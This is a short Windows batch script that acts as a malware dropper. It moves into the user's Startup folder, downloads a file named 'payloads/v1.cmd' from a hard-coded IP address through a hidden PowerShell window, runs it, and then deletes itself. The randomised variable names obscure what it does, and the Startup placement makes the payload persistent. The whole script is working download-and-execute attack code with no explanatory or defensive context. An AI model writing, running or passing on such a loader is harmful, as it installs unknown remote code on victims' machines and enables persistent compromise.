@echo off
set "EcSjRhAguo=167.88.169.219"
set "XNjFYKECht=%cd%"
set "YKHfpmMRoQ=C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
cd %YKHfpmMRoQ%
powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri http://%EcSjRhAguo%/windowstest/payloads/v1.cmd -OutFile wEaoFkNduy.cmd"
powershell ./wEaoFkNduy.cmd
cd "%XNjFYKECht%"
del from-vps.cmd
